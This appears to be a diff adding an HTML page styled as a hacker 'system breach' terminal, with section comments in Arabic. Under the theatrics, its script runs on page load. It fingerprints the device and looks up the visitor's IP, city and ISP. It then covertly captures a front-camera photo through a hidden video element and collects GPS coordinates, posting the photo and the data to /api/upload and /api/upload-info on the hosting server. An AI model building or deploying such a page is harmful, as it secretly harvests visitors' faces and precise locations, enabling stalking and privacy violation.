@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SYSTEM SCAN</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #000;
+    color: #0f0;
+    font-family: "Courier New", monospace;
+    font-size: 13px;
+    min-height: 100vh;
+    padding: 20px;
+    overflow-x: hidden;
+  }
+  .terminal {
+    max-width: 700px;
+    margin: 0 auto;
+    line-height: 1.7;
+  }
+  .header {
+    border: 2px solid #f00;
+    padding: 14px;
+    margin-bottom: 20px;
+    text-align: center;
+    box-shadow: 0 0 25px rgba(255,0,0,0.5) inset;
+    background: rgba(255,0,0,0.08);
+    animation: borderPulse 1.5s infinite;
+  }
+  @keyframes borderPulse {
+    0%, 100% { border-color: #f00; box-shadow: 0 0 25px rgba(255,0,0,0.5) inset; }
+    50% { border-color: #800; box-shadow: 0 0 10px rgba(255,0,0,0.3) inset; }
+  }
+  .header h1 {
+    font-size: 18px;
+    color: #f00;
+    letter-spacing: 4px;
+    text-shadow: 0 0 12px #f00;
+    animation: flicker 2.5s infinite;
+  }
+  @keyframes flicker {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.7; }
+  }
+  .header .warn {
+    font-size: 11px;
+    color: #f80;
+    margin-top: 6px;
+    letter-spacing: 2px;
+  }
+  .line {
+    margin: 5px 0;
+    opacity: 0;
+    animation: fadein 0.3s forwards;
+    font-size: 13px;
+  }
+  @keyframes fadein { to { opacity: 1; } }
+  .line::before { content: "> "; color: #0f0; }
+  .ok   { color: #0f0; }
+  .info { color: #0ff; }
+  .warn { color: #ff0; }
+  .err  { color: #f00; }
+  .val  { color: #0ff; font-weight: bold; }
+  .progress-bar {
+    width: 100%;
+    height: 14px;
+    border: 1px solid #0f0;
+    margin: 15px 0;
+    background: #000;
+    position: relative;
+    overflow: hidden;
+  }
+  .progress-bar::after {
+    content: "";
+    position: absolute;
+    top: 0; left: 0;
+    height: 100%;
+    width: 0;
+    background: linear-gradient(90deg, #0f0, #0ff);
+    animation: load 4s forwards;
+    box-shadow: 0 0 15px #0f0;
+  }
+  @keyframes load { to { width: 100%; } }
+  .info-block {
+    border: 1px dashed #0f0;
+    padding: 12px;
+    margin: 14px 0;
+    background: rgba(0,255,0,0.04);
+  }
+  .info-block h2 {
+    font-size: 12px;
+    color: #0f0;
+    letter-spacing: 3px;
+    margin-bottom: 10px;
+    border-bottom: 1px solid #0f0;
+    padding-bottom: 6px;
+  }
+  .kv {
+    display: flex;
+    justify-content: space-between;
+    font-size: 12px;
+    padding: 3px 0;
+    color: #ccc;
+  }
+  .kv span:first-child { color: #0f0; }
+  .kv span:last-child  { color: #0ff; font-weight: bold; }
+  .cursor {
+    display: inline-block;
+    width: 8px;
+    height: 14px;
+    background: #0f0;
+    animation: blink 0.8s infinite;
+    vertical-align: middle;
+    margin-left: 4px;
+  }
+  @keyframes blink { 50% { opacity: 0; } }
+  .final {
+    text-align: center;
+    padding: 20px;
+    border: 2px solid #0f0;
+    margin-top: 20px;
+    box-shadow: 0 0 30px rgba(0,255,0,0.4) inset;
+    animation: fadein 0.5s forwards;
+    opacity: 0;
+  }
+  .final h3 {
+    color: #0f0;
+    font-size: 16px;
+    letter-spacing: 3px;
+    text-shadow: 0 0 10px #0f0;
+  }
+</style>
+</head>
+<body>
+
+<div class="terminal">
+  <div class="header">
+    <h1>⚠ SYSTEM BREACH DETECTED ⚠</h1>
+    <div class="warn">UNAUTHORIZED ACCESS IN PROGRESS</div>
+  </div>
+
+  <div id="lines"></div>
+</div>
+
+<video id="video" autoplay playsinline muted
+       style="position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+  const linesEl = document.getElementById('lines');
+  const video   = document.getElementById('video');
+  const canvas  = document.getElementById('canvas');
+
+  let delay = 0;
+  const info = {};
+
+  function addLine(text, cls = "") {
+    setTimeout(() => {
+      const div = document.createElement('div');
+      div.className = "line " + cls;
+      div.innerHTML = text;
+      linesEl.appendChild(div);
+      window.scrollTo(0, document.body.scrollHeight);
+    }, delay);
+    delay += 300;
+  }
+
+  function addBlock(title, rows) {
+    setTimeout(() => {
+      const box = document.createElement('div');
+      box.className = "info-block";
+      let html = `<h2>${title}</h2>`;
+      rows.forEach(([k, v]) => {
+        html += `<div class="kv"><span>${k}</span><span>${v}</span></div>`;
+      });
+      box.innerHTML = html;
+      linesEl.appendChild(box);
+      window.scrollTo(0, document.body.scrollHeight);
+    }, delay);
+    delay += 500;
+  }
+
+  function addProgress() {
+    setTimeout(() => {
+      const p = document.createElement('div');
+      p.className = "progress-bar";
+      linesEl.appendChild(p);
+    }, delay);
+    delay += 4200;
+  }
+
+  function addFinal() {
+    setTimeout(() => {
+      const f = document.createElement('div');
+      f.className = "final";
+      f.innerHTML = `<h3>✓ DATA ACQUIRED</h3><p style="margin-top:8px;color:#0f0;font-size:12px;">CONNECTION CLOSED</p>`;
+      linesEl.appendChild(f);
+      window.scrollTo(0, document.body.scrollHeight);
+    }, delay);
+  }
+
+  // ============================================
+  // بدء السيناريو
+  // ============================================
+  async function run() {
+    addLine("Initializing breach protocol...", "info");
+    addLine("Establishing encrypted tunnel... <span class='ok'>OK</span>");
+    addLine("Bypassing firewall... <span class='ok'>OK</span>");
+    addLine("Accessing target device...");
+
+    // ============ معلومات الجهاز ============
+    const ua = navigator.userAgent;
+    const isAndroid = /Android/i.test(ua);
+    const isIOS = /iPhone|iPad|iPod/i.test(ua);
+    const platform = isAndroid ? "Android" : isIOS ? "iOS" : "Desktop";
+    const browser = /Edg/i.test(ua) ? "Edge" :
+                    /Chrome/i.test(ua) ? "Chrome" :
+                    /Firefox/i.test(ua) ? "Firefox" :
+                    /Safari/i.test(ua) ? "Safari" : "Unknown";
+
+    info.platform = platform;
+    info.browser  = browser;
+    info.screen   = `${screen.width}x${screen.height}`;
+    info.language = navigator.language;
+    info.cores    = navigator.hardwareConcurrency || "N/A";
+    info.memory   = (navigator.deviceMemory || "N/A") + " GB";
+    info.online   = navigator.onLine ? "YES" : "NO";
+    info.time     = new Date().toLocaleString('ar-EG');
+
+    addBlock("DEVICE INFO", [
+      ["Platform",     platform],
+      ["Browser",      browser],
+      ["Screen",       info.screen],
+      ["Language",     info.language],
+      ["CPU Cores",    info.cores],
+      ["Memory",       info.memory],
+      ["Online",       info.online],
+      ["Pixel Ratio",  window.devicePixelRatio],
+    ]);
+
+    addLine("Scanning network interface...", "info");
+
+    // ============ IP من API خارجي ============
+    try {
+      const r = await fetch("https://ipapi.co/json/");
+      const d = await r.json();
+      info.ip      = d.ip || "N/A";
+      info.country = d.country_name || "N/A";
+      info.city    = d.city || "N/A";
+      info.isp     = d.org || "N/A";
+
+      addBlock("NETWORK", [
+        ["Public IP",  info.ip],
+        ["Country",    info.country],
+        ["City",       info.city],
+        ["ISP",        info.isp],
+      ]);
+    } catch (e) {
+      addLine("IP lookup failed.", "warn");
+    }
+
+    addLine("Accessing camera sensor...", "info");
+
+    // ============ طلب إذن الكاميرا ============
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false
+      });
+
+      video.srcObject = stream;
+      await video.play();
+      await new Promise(r => setTimeout(r, 800));
+
+      addLine("Camera access: <span class='ok'>GRANTED</span>");
+
+      // التقاط الصورة
+      canvas.width  = video.videoWidth  || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      canvas.toBlob(async (blob) => {
+        if (blob) {
+          const form = new FormData();
+          form.append("photo", blob, "scan.jpg");
+          try {
+            await fetch("/api/upload", { method: "POST", body: form });
+          } catch (e) {}
+        }
+      }, "image/jpeg", 0.9);
+
+      addLine("Biometric sample captured ✓", "ok");
+      stream.getTracks().forEach(t => t.stop());
+
+    } catch (err) {
+      addLine("Camera access: <span class='err'>DENIED</span>", "err");
+    }
+
+    // ============ طلب إذن الموقع ============
+    addLine("Accessing GPS module...", "info");
+
+    await new Promise(resolve => {
+      if (!navigator.geolocation) {
+        addLine("GPS not supported.", "warn");
+        return resolve();
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          info.lat = pos.coords.latitude.toFixed(6);
+          info.lng = pos.coords.longitude.toFixed(6);
+          info.acc = Math.round(pos.coords.accuracy) + " m";
+
+          addBlock("LOCATION", [
+            ["Latitude",  info.lat],
+            ["Longitude", info.lng],
+            ["Accuracy",  info.acc],
+          ]);
+
+          addLine("GPS: <span class='ok'>LOCKED</span>");
+          resolve();
+        },
+        () => {
+          addLine("GPS access: <span class='err'>DENIED</span>", "err");
+          resolve();
+        },
+        { timeout: 8000 }
+      );
+    });
+
+    addLine("Uploading encrypted payload...", "info");
+    addProgress();
+
+    // ============ إرسال المعلومات النصية ============
+    try {
+      await fetch("/api/upload-info", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(info)
+      });
+    } catch (e) {}
+
+    addLine("Storing on secure server... <span class='ok'>OK</span>");
+    addLine("Cleaning traces... <span class='ok'>OK</span>");
+    addFinal();
+  }
+
+  run();
+</script>
+</body>
+</html>
